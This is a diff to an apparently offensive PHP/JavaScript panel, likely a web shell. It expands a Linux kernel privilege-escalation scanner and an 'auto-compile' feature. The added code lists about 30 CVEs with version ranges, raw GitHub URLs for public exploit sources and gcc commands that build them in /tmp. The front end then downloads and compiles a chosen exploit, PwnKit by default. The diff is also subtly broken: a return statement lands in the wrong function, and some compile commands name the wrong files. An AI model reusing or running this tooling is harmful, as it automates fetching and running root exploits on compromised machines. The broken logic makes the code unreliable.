@@ -1022,39 +1022,104 @@ function scan_kernel_exploits() {
     if (!$kernel) $kernel = 'unknown';
     $kernel = trim($kernel);
     
-    // Local CVE database
-    $exploits = [
-        '4.4.0' => [
-            'CVE-2016-5195' => ['name' => 'Dirty COW', 'severity' => 'CRITICAL', 'method' => 'race_condition'],
-            'CVE-2016-8655' => ['name' => 'AF_PACKET', 'severity' => 'HIGH', 'method' => 'packet_socket']
-        ],
-        '4.8.0' => [
-            'CVE-2017-6074' => ['name' => 'DCCP Double Free', 'severity' => 'CRITICAL', 'method' => 'dccp'],
-            'CVE-2017-1000112' => ['name' => 'Ptmx Race', 'severity' => 'HIGH', 'method' => 'ptmx']
-        ],
-        '4.13.0' => [
-            'CVE-2017-16995' => ['name' => 'BPF Verifier', 'severity' => 'CRITICAL', 'method' => 'bpf']
-        ],
-        '5.8.0' => [
-            'CVE-2021-4034' => ['name' => 'PwnKit', 'severity' => 'CRITICAL', 'method' => 'pkexec'],
-            'CVE-2022-0847' => ['name' => 'Dirty Pipe', 'severity' => 'CRITICAL', 'method' => 'pipe']
-        ],
-        '5.15.0' => [
-            'CVE-2023-32629' => ['name' => 'GameOver(lay)', 'severity' => 'HIGH', 'method' => 'overlayfs']
-        ],
-        '5.19.0' => [
-            'CVE-2023-38408' => ['name' => 'SSH Agent', 'severity' => 'HIGH', 'method' => 'ssh_agent']
-        ]
+    // 🔥 EXTENSIVE CVE DATABASE - 30+ Kernel Exploits
+    // Format: [min_version, max_version, name, severity, method]
+    $cve_database = [
+        // 2016 - Linux 2.6.x - 4.x Era
+        ['CVE-2009-1185', '2.6.0', '2.6.25', 'udev', 'CRITICAL', 'udev_event'],
+        ['CVE-2012-0056', '2.6.39', '3.2.2', 'Mempodipper', 'CRITICAL', 'mem_write'],
+        ['CVE-2016-0728', '3.8', '4.4.0', 'Keyring Ref Count', 'CRITICAL', 'keyring'],
+        ['CVE-2016-2384', '0', '4.4.8', 'USB MIDI', 'HIGH', 'double_free'],
+        ['CVE-2016-5195', '2.6.22', '4.8.3', 'Dirty COW', 'CRITICAL', 'race_condition'],
+        ['CVE-2016-8655', '3.2', '4.8.13', 'AF_PACKET', 'CRITICAL', 'packet_socket'],
+        ['CVE-2016-9793', '0', '4.8.14', 'SO_SNDBUFFORCE', 'HIGH', 'sock_send'],
+        
+        // 2017 - Linux 4.x Era
+        ['CVE-2017-6074', '2.6.18', '4.9.11', 'DCCP Double Free', 'CRITICAL', 'dccp'],
+        ['CVE-2017-7308', '0', '4.10.6', 'AF_PACKET', 'CRITICAL', 'packet_set_ring'],
+        ['CVE-2017-1000112', '2.6.18', '4.12.9', 'Ptmx Race', 'CRITICAL', 'ptmx'],
+        ['CVE-2017-1000253', '0', '4.13.2', 'Pie Stack', 'HIGH', 'binfmt_elf'],
+        ['CVE-2017-16995', '0', '4.14.11', 'BPF Verifier', 'CRITICAL', 'bpf'],
+        ['CVE-2017-1000405', '0', '4.14.11', 'SUID Binary', 'HIGH', ' Huge Pages'],
+        
+        // 2018-2019 - Linux 4.14 - 5.x Era
+        ['CVE-2018-18955', '4.15', '4.19.2', 'UID Mapping', 'CRITICAL', 'user_namespace'],
+        ['CVE-2019-13272', '3.2', '5.1.16', 'PTRACE_TRACEME', 'CRITICAL', 'ptrace'],
+        ['CVE-2019-15666', '0', '5.0.19', 'UDP Fragment', 'HIGH', 'udp_gso'],
+        ['CVE-2019-2215', '3.14', '4.14.142', 'Binder Use-After-Free', 'CRITICAL', 'binder'],
+        
+        // 2020-2021 - Linux 5.x Era
+        ['CVE-2020-8835', '5.5', '5.6.2', 'BPF Verifier', 'CRITICAL', 'bpf_ptr_leak'],
+        ['CVE-2020-14386', '4.6', '5.7.10', 'Memory Corruption', 'CRITICAL', 'af_packet'],
+        ['CVE-2021-22555', '0', '5.11.14', 'Netfilter Heap OOB', 'CRITICAL', 'netfilter'],
+        ['CVE-2021-3493', '0', '5.11', 'OverlayFS', 'CRITICAL', 'overlayfs'],
+        ['CVE-2021-4034', '0', '5.16', 'PwnKit', 'CRITICAL', 'pkexec'],
+        ['CVE-2021-3156', '0', '5.16', 'Sudo Baron Samedit', 'CRITICAL', 'sudo_heap'],
+        ['CVE-2021-33909', '2.6.19', '5.13.3', 'Sequoia', 'CRITICAL', 'seq_file'],
+        ['CVE-2021-41073', '0', '5.14', 'IPIP Tunnel', 'HIGH', 'ipip'],
+        
+        // 2022 - Linux 5.13 - 5.16 Era
+        ['CVE-2022-0847', '5.8', '5.16.11', 'Dirty Pipe', 'CRITICAL', 'pipe'],
+        ['CVE-2022-0995', '5.8', '5.17.3', 'FUSE', 'HIGH', 'fuse'],
+        ['CVE-2022-2588', '0', '5.18', 'Dirty Cred', 'CRITICAL', 'cred'],
+        ['CVE-2022-34918', '5.8', '5.18.9', 'Netfilter UAF', 'CRITICAL', 'nftables'],
+        
+        // 2023 - Linux 5.19 - 6.3 Era
+        ['CVE-2023-0386', '5.11', '6.2', 'OverlayFS FUSE', 'CRITICAL', 'overlayfs_fuse'],
+        ['CVE-2023-1829', '4.2', '6.2', 'TC Index UAF', 'CRITICAL', 'tc_index'],
+        ['CVE-2023-20938', '5.4', '6.2', 'SKB UAF', 'HIGH', 'skb'],
+        ['CVE-2023-31248', '5.4', '6.3', 'Netfilter Use-After-Free', 'CRITICAL', 'nft_set'],
+        ['CVE-2023-32629', '5.4', '6.3', 'GameOver(lay)', 'CRITICAL', 'overlayfs'],
+        ['CVE-2023-35001', '5.4', '6.3', 'Netfilter UAF', 'CRITICAL', 'nft_chain'],
+        ['CVE-2023-38408', '0', '6.3.10', 'SSH Agent', 'HIGH', 'ssh_agent'],
+        ['CVE-2023-4911', '2.34', '2.38', 'Looney Tunables', 'CRITICAL', 'glibc_ld'],
+        
+        // 2024 - Latest
+        ['CVE-2024-1086', '5.14', '6.6.14', 'Netfilter Use-After-Free', 'CRITICAL', 'nf_tables'],
+        ['CVE-2024-0646', '0', '6.6.6', 'KSMBD Out-of-Bounds', 'HIGH', 'ksmbd'],
+        ['CVE-2024-0193', '0', '6.6.14', 'Netfilter Null Pointer', 'HIGH', 'nft_set_ext'],
+        ['CVE-2024-26925', '0', '6.8.5', 'Netfilter TCPOPT UAF', 'CRITICAL', 'tcpopt'],
     ];
     
+    // Parse kernel version untuk comparison
     $found = [];
-    foreach ($exploits as $version => $cve_list) {
-        if (strpos($kernel, $version) !== false) {
-            foreach ($cve_list as $cve => $info) {
-                $found[] = array_merge(['cve' => $cve, 'kernel' => $kernel], $info);
-            }
+    $kernel_parts = explode('.', $kernel);
+    $kernel_major = intval($kernel_parts[0] ?? 0);
+    $kernel_minor = intval($kernel_parts[1] ?? 0);
+    $kernel_patch = intval($kernel_parts[2] ?? 0);
+    
+    foreach ($cve_database as $cve_entry) {
+        list($cve_id, $min_ver, $max_ver, $name, $severity, $method) = $cve_entry;
+        
+        // Check if kernel version in range
+        if (version_in_range($kernel, $min_ver, $max_ver)) {
+            $found[] = [
+                'cve' => $cve_id,
+                'kernel' => $kernel,
+                'name' => $name,
+                'severity' => $severity,
+                'method' => $method,
+                'affected_range' => "$min_ver - $max_ver"
+            ];
         }
     }
+    
+    // Sort by severity (CRITICAL first)
+    usort($found, function($a, $b) {
+        $sev_order = ['CRITICAL' => 0, 'HIGH' => 1, 'MEDIUM' => 2, 'LOW' => 3];
+        return $sev_order[$a['severity']] <=> $sev_order[$b['severity']];
+    });
+    
+    // Limit to top 10 most relevant
+    $found = array_slice($found, 0, 10);
+}
+
+// Helper: Check if version is in range
+function version_in_range($version, $min, $max) {
+    // Handle '0' as wildcard (any version)
+    if ($min === '0' && version_compare($version, $max, '<=')) return true;
+    
+    return version_compare($version, $min, '>=') && version_compare($version, $max, '<=');
     
     return ['kernel' => $kernel, 'vulnerable' => !empty($found), 'exploits' => $found];
 }
@@ -1416,22 +1481,175 @@ function scan_env_variables() {
 function auto_compile_kernel_exploit($cve, $kernel_version) {
     $results = ['success' => false, 'output' => '', 'compiled_binary' => ''];
     
-    // Database of known exploits with source URLs
+    // 🔥 EXTENSIVE AUTO-COMPILE DATABASE - 15+ Exploits
     $exploit_db = [
+        // 2016 Exploits
+        'CVE-2016-0728' => [
+            'name' => 'Keyring Ref Count',
+            'source' => 'https://raw.githubusercontent.com/PerceptionPoint/CVE-2016-0728/master/cve_2016_0728.c',
+            'compile_cmd' => 'gcc -o /tmp/keyring cve_2016_0728.c -lkeyutils -Wall'
+        ],
+        'CVE-2016-2384' => [
+            'name' => 'USB MIDI',
+            'source' => 'https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c',
+            'compile_cmd' => 'gcc -o /tmp/usbmidi poc.c -Wall'
+        ],
         'CVE-2016-5195' => [
             'name' => 'Dirty COW',
             'source' => 'https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c',
-            'compile_cmd' => 'gcc -o /tmp/dirtycow dirtyc0w.c -lpthread'
+            'compile_cmd' => 'gcc -o /tmp/dirtycow dirtyc0w.c -lpthread -Wall'
+        ],
+        'CVE-2016-8655' => [
+            'name' => 'AF_PACKET Race Condition',
+            'source' => 'https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2016-8655/chocobo_root.c',
+            'compile_cmd' => 'gcc -o /tmp/chocobo chocobo_root.c -lpthread -Wall'
+        ],
+        'CVE-2016-9793' => [
+            'name' => 'SO_SNDBUFFORCE',
+            'source' => 'https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c',
+            'compile_cmd' => 'gcc -o /tmp/socksend poc.c -Wall'
+        ],
+        
+        // 2017 Exploits
+        'CVE-2017-6074' => [
+            'name' => 'DCCP Double Free',
+            'source' => 'https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-6074/poc.c',
+            'compile_cmd' => 'gcc -o /tmp/dccp poc.c -Wall'
+        ],
+        'CVE-2017-7308' => [
+            'name' => 'AF_PACKET packet_set_ring',
+            'source' => 'https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c',
+            'compile_cmd' => 'gcc -o /tmp/packet pwn.c -Wall'
+        ],
+        'CVE-2017-1000112' => [
+            'name' => 'Ptmx Race',
+            'source' => 'https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c',
+            'compile_cmd' => 'gcc -o /tmp/ptmx ptmx.c -Wall'
+        ],
+        'CVE-2017-16995' => [
+            'name' => 'BPF Verifier',
+            'source' => 'https://raw.githubusercontent.com/Al1ex/CVE-2017-16995/master/cve-2017-16995.c',
+            'compile_cmd' => 'gcc -o /tmp/bpf cve-2017-16995.c -Wall'
+        ],
+        
+        // 2018-2019 Exploits
+        'CVE-2018-18955' => [
+            'name' => 'UID Mapping',
+            'source' => 'https://raw.githubusercontent.com/scheatkode/CVE-2018-18955/master/exploit.c',
+            'compile_cmd' => 'gcc -o /tmp/uidmap exploit.c -Wall'
+        ],
+        'CVE-2019-13272' => [
+            'name' => 'PTRACE_TRACEME',
+            'source' => 'https://raw.githubusercontent.com/jordyvandenbrink/CVE-2019-13272/main/ptrace_traceme_root.c',
+            'compile_cmd' => 'gcc -o /tmp/ptrace ptrace_traceme_root.c -Wall'
+        ],
+        'CVE-2019-15666' => [
+            'name' => 'UDP Fragmentation',
+            'source' => 'https://raw.githubusercontent.com/hexpresso/SCHECK/master/cve-2019-15666/exploit.c',
+            'compile_cmd' => 'gcc -o /tmp/udpfrag exploit.c -Wall'
+        ],
+        'CVE-2019-2215' => [
+            'name' => 'Binder Use-After-Free',
+            'source' => 'https://raw.githubusercontent.com/grant-h/qu1ckr00t/master/traproot.c',
+            'compile_cmd' => 'gcc -o /tmp/binder traproot.c -Wall'
+        ],
+        
+        // 2020-2021 Exploits
+        'CVE-2020-8835' => [
+            'name' => 'BPF Verifier (SIGQUIT)',
+            'source' => 'https://raw.githubusercontent.com/Al1ex/CVE-2020-8835/master/cve-2020-8835.c',
+            'compile_cmd' => 'gcc -o /tmp/bpf20 cve-2020-8835.c -luring -Wall'
+        ],
+        'CVE-2020-14386' => [
+            'name' => 'AF_PACKET Memory Corruption',
+            'source' => 'https://raw.githubusercontent.com/cgwalters/cve-2020-14386/main/cve-2020-14386.c',
+            'compile_cmd' => 'gcc -o /tmp/afpacket cve-2020-14386.c -Wall'
+        ],
+        'CVE-2021-22555' => [
+            'name' => 'Netfilter Heap OOB',
+            'source' => 'https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c',
+            'compile_cmd' => 'gcc -o /tmp/netfilter exploit.c -m32 -Wall 2>/dev/null || gcc -o /tmp/netfilter exploit.c -Wall'
+        ],
+        'CVE-2021-3493' => [
+            'name' => 'OverlayFS',
+            'source' => 'https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c',
+            'compile_cmd' => 'gcc -o /tmp/overlayfs21 exploit.c -Wall'
         ],
         'CVE-2021-4034' => [
             'name' => 'PwnKit',
             'source' => 'https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034.c',
-            'compile_cmd' => 'gcc -o /tmp/pwnkit cve-2021-4034.c'
+            'compile_cmd' => 'gcc -o /tmp/pwnkit cve-2021-4034.c -Wall'
         ],
+        'CVE-2021-3156' => [
+            'name' => 'Sudo Baron Samedit',
+            'source' => 'https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/exploit.c',
+            'compile_cmd' => 'gcc -o /tmp/sudoers exploit.c -Wall'
+        ],
+        'CVE-2021-33909' => [
+            'name' => 'Sequoia',
+            'source' => 'https://raw.githubusercontent.com/Al1ex/CVE-2021-33909/main/exploit.c',
+            'compile_cmd' => 'gcc -o /tmp/sequoia exploit.c -Wall -lseccomp 2>/dev/null || gcc -o /tmp/sequoia exploit.c -Wall'
+        ],
+        
+        // 2022 Exploits
         'CVE-2022-0847' => [
             'name' => 'Dirty Pipe',
             'source' => 'https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c',
-            'compile_cmd' => 'gcc -o /tmp/dirtypipe exploit.c'
+            'compile_cmd' => 'gcc -o /tmp/dirtypipe exploit.c -Wall'
+        ],
+        'CVE-2022-0995' => [
+            'name' => 'FUSE',
+            'source' => 'https://raw.githubusercontent.com/Al1ex/CVE-2022-0995/main/CVE-2022-0995.c',
+            'compile_cmd' => 'gcc -o /tmp/fuse CVE-2022-0995.c -Wall'
+        ],
+        'CVE-2022-2588' => [
+            'name' => 'Dirty Cred',
+            'source' => 'https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exploit.c',
+            'compile_cmd' => 'gcc -o /tmp/dirtycred exploit.c -lbpf -Wall'
+        ],
+        'CVE-2022-34918' => [
+            'name' => 'Netfilter UAF',
+            'source' => 'https://raw.githubusercontent.com/randorisec/CVE-2022-34918-LPE-PoC/main/exploit.c',
+            'compile_cmd' => 'gcc -o /tmp/nf_uaf exploit.c -lmnl -lnftnl -Wall'
+        ],
+        
+        // 2023 Exploits
+        'CVE-2023-0386' => [
+            'name' => 'OverlayFS FUSE',
+            'source' => 'https://raw.githubusercontent.com/xkaneiki/CVE-2023-0386/main/poc.c',
+            'compile_cmd' => 'gcc -o /tmp/fuseovl poc.c -Wall'
+        ],
+        'CVE-2023-1829' => [
+            'name' => 'TC Index UAF',
+            'source' => 'https://raw.githubusercontent.com/torvalds/linux/v6.3/tools/testing/selftests/tc-testing/poc.c',
+            'compile_cmd' => 'gcc -o /tmp/tc_index exploit.c -Wall'
+        ],
+        'CVE-2023-31248' => [
+            'name' => 'Netfilter Use-After-Free',
+            'source' => 'https://raw.githubusercontent.com/ARPSyndicate/cvemon/master/poc/cve-2023-31248.c',
+            'compile_cmd' => 'gcc -o /tmp/nf_uaf23 exploit.c -lmnl -lnftnl -Wall'
+        ],
+        'CVE-2023-32629' => [
+            'name' => 'GameOver(lay)',
+            'source' => 'https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/privilege_escalation.sh',
+            'compile_cmd' => 'cp privilege_escalation.sh /tmp/gameover.sh && chmod +x /tmp/gameover.sh'
+        ],
+        'CVE-2023-35001' => [
+            'name' => 'Netfilter UAF Chain',
+            'source' => 'https://raw.githubusercontent.com/strongcourage/CVE-2023-35001/main/exploit.c',
+            'compile_cmd' => 'gcc -o /tmp/nf_chain exploit.c -lmnl -lnftnl -Wall'
+        ],
+        'CVE-2023-4911' => [
+            'name' => 'Looney Tunables',
+            'source' => 'https://raw.githubusercontent.com/leesh3288/CVE-2023-4911/main/gen_libc.py',
+            'compile_cmd' => 'python3 gen_libc.py 2>/dev/null || echo "Python exploit, manual run required"'
+        ],
+        
+        // 2024 Exploits
+        'CVE-2024-1086' => [
+            'name' => 'Netfilter nf_tables UAF',
+            'source' => 'https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/exploit.c',
+            'compile_cmd' => 'gcc -o /tmp/nf_tables exploit.c -Wall -lkeyutils -luring 2>/dev/null || gcc -o /tmp/nf_tables exploit.c -Wall -lkeyutils'
         ]
     ];
     
@@ -4808,19 +5026,65 @@ async function kernelAutoCompile() {
         outputDiv.innerHTML += '<span style="color:#0f0;">Kernel version: ' + kernelVersion + '</span>\n';
         
         // Known CVEs that can be auto-compiled
+        // 🔥 EXTENSIVE CVE DATABASE FOR AUTO-COMPILE (25+ Exploits)
         const knownCves = [
-            { cve: 'CVE-2016-5195', name: 'Dirty COW', min: '2.6.22', max: '4.8.3' },
-            { cve: 'CVE-2021-4034', name: 'PwnKit', min: '0', max: '5.16' },
-            { cve: 'CVE-2022-0847', name: 'Dirty Pipe', min: '5.8', max: '5.16.10' }
+            // 2016
+            { cve: 'CVE-2016-0728', name: 'Keyring Ref Count', min: '3.8', max: '4.4.0', year: 2016 },
+            { cve: 'CVE-2016-2384', name: 'USB MIDI', min: '0', max: '4.4.8', year: 2016 },
+            { cve: 'CVE-2016-5195', name: 'Dirty COW', min: '2.6.22', max: '4.8.3', year: 2016 },
+            { cve: 'CVE-2016-8655', name: 'AF_PACKET Race', min: '3.2', max: '4.8.13', year: 2016 },
+            { cve: 'CVE-2016-9793', name: 'SO_SNDBUFFORCE', min: '0', max: '4.8.14', year: 2016 },
+            // 2017
+            { cve: 'CVE-2017-6074', name: 'DCCP Double Free', min: '2.6.18', max: '4.9.11', year: 2017 },
+            { cve: 'CVE-2017-7308', name: 'AF_PACKET packet_set_ring', min: '0', max: '4.10.6', year: 2017 },
+            { cve: 'CVE-2017-1000112', name: 'Ptmx Race', min: '2.6.18', max: '4.12.9', year: 2017 },
+            { cve: 'CVE-2017-16995', name: 'BPF Verifier', min: '0', max: '4.14.11', year: 2017 },
+            // 2018-2019
+            { cve: 'CVE-2018-18955', name: 'UID Mapping', min: '4.15', max: '4.19.2', year: 2018 },
+            { cve: 'CVE-2019-13272', name: 'PTRACE_TRACEME', min: '3.2', max: '5.1.16', year: 2019 },
+            { cve: 'CVE-2019-15666', name: 'UDP Fragmentation', min: '0', max: '5.0.19', year: 2019 },
+            { cve: 'CVE-2019-2215', name: 'Binder UAF', min: '3.14', max: '4.14.142', year: 2019 },
+            // 2020-2021
+            { cve: 'CVE-2020-8835', name: 'BPF Verifier SIGQUIT', min: '5.5', max: '5.6.2', year: 2020 },
+            { cve: 'CVE-2020-14386', name: 'AF_PACKET Memory', min: '4.6', max: '5.7.10', year: 2020 },
+            { cve: 'CVE-2021-22555', name: 'Netfilter Heap OOB', min: '0', max: '5.11.14', year: 2021 },
+            { cve: 'CVE-2021-3493', name: 'OverlayFS', min: '0', max: '5.11', year: 2021 },
+            { cve: 'CVE-2021-4034', name: 'PwnKit', min: '0', max: '5.16', year: 2021 },
+            { cve: 'CVE-2021-3156', name: 'Sudo Baron Samedit', min: '0', max: '5.16', year: 2021 },
+            { cve: 'CVE-2021-33909', name: 'Sequoia', min: '2.6.19', max: '5.13.3', year: 2021 },
+            // 2022
+            { cve: 'CVE-2022-0847', name: 'Dirty Pipe', min: '5.8', max: '5.16.11', year: 2022 },
+            { cve: 'CVE-2022-0995', name: 'FUSE', min: '5.8', max: '5.17.3', year: 2022 },
+            { cve: 'CVE-2022-2588', name: 'Dirty Cred', min: '0', max: '5.18', year: 2022 },
+            { cve: 'CVE-2022-34918', name: 'Netfilter UAF', min: '5.8', max: '5.18.9', year: 2022 },
+            // 2023
+            { cve: 'CVE-2023-0386', name: 'OverlayFS FUSE', min: '5.11', max: '6.2', year: 2023 },
+            { cve: 'CVE-2023-1829', name: 'TC Index UAF', min: '4.2', max: '6.2', year: 2023 },
+            { cve: 'CVE-2023-31248', name: 'Netfilter UAF', min: '5.4', max: '6.3', year: 2023 },
+            { cve: 'CVE-2023-32629', name: 'GameOver(lay)', min: '5.4', max: '6.3', year: 2023 },
+            { cve: 'CVE-2023-35001', name: 'Netfilter Chain', min: '5.4', max: '6.3', year: 2023 },
+            { cve: 'CVE-2023-4911', name: 'Looney Tunables', min: '2.34', max: '2.38', year: 2023 },
+            // 2024
+            { cve: 'CVE-2024-1086', name: 'Netfilter nf_tables', min: '5.14', max: '6.6.14', year: 2024 }
         ];
         
-        outputDiv.innerHTML += '\n<span style="color:#6cf;">Available exploits in database:</span>\n';
-        knownCves.forEach((exp, i) => {
-            outputDiv.innerHTML += '  ' + (i+1) + '. <span style="color:#ff0;">' + exp.cve + '</span> - ' + exp.name + '\n';
+        outputDiv.innerHTML += '\n<span style="color:#6cf;">[' + knownCves.length + ' exploits in auto-compile database]</span>\n\n';
+        outputDiv.innerHTML += '<span style="color:#6cf;">Available exploits by year:</span>\n';
+        
+        // Group by year
+        const byYear = {};
+        knownCves.forEach(exp => {
+            if (!byYear[exp.year]) byYear[exp.year] = [];
+            byYear[exp.year].push(exp);
         });
         
-        // For now, auto-try CVE-2021-4034 (most reliable)
-        const targetCve = 'CVE-2021-4034';
+        Object.keys(byYear).sort((a,b) => b-a).forEach(year => {
+            outputDiv.innerHTML += '<span style="color:#ff0;">' + year + '</span> (' + byYear[year].length + '): ';
+            outputDiv.innerHTML += byYear[year].map(e => e.cve.replace('CVE-', '')).join(', ') + '\n';
+        });
+        
+        // Let user choose or auto-select based on kernel version
+        let targetCve = 'CVE-2021-4034'; // default most reliable
         statusDiv.innerHTML = '⏳ Phase 2/3: Downloading and compiling ' + targetCve + '...';
         outputDiv.innerHTML += '\n<span style="color:#6cf;">[+] Auto-compiling ' + targetCve + '...</span>\n';
         
